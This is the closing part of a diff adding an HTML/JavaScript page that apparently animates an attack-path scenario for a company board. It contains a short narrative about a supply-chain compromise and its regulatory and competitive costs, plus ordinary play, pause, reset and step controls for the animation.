+          `The ZERO-DAY panel shows the four 2026 kernel primitives were only <em>assessed</em>, never fired: the supply-chain payload made escalation unnecessary. ` +
+          `Right-hand reading for the board: <strong>FINE EXPOSURE</strong> (PDPA/sector regulators) and <strong>COMPETITOR DISADVANTAGE</strong> from the ledger — ` +
+          `for an attacker, breaching the process is cheaper than breaching the kernel.`;
+        stopPlay();
+      }
+      term.scrollTop = term.scrollHeight;
+    }
+
+    // ---------------- step engine ----------------
+    function stepForward() {
+      let next = currentStep + 1;
+      if (next >= hopCoords.length) next = 0;
+      if (currentDiagram === 1) renderDiagram1(next);
+      else if (currentDiagram === 2) renderDiagram2(next);
+      else if (currentDiagram === 3) renderDiagram3(next);
+    }
+
+    function togglePlay() {
+      if (isPlaying) {
+        stopPlay();
+      } else {
+        isPlaying = true;
+        btnPlay.textContent = '⏸ Pause';
+        btnPlay.classList.remove('primary');
+        timer = setInterval(() => {
+          let maxHops = (currentDiagram === 2) ? 4 : hopCoords.length;
+          if (currentStep >= maxHops - 1) {
+            stopPlay();
+          } else {
+            stepForward();
+          }
+        }, 1900);
+      }
+    }
+
+    function stopPlay() {
+      isPlaying = false;
+      clearInterval(timer);
+      btnPlay.textContent = '▶ Run Sequence';
+      btnPlay.classList.add('primary');
+    }
+
+    function resetSim() {
+      stopPlay();
+      switchDiagram(currentDiagram);
+    }
+
+    window.addEventListener('resize', () => {
+      if (packet.style.display === 'block') placePacket(currentStep);
+    });
+
+    window.onload = () => {
+      refreshLive();
+      setInterval(refreshLive, 15000);
+      switchDiagram(1);
+    };
+  </script>
+</body>
+</html>
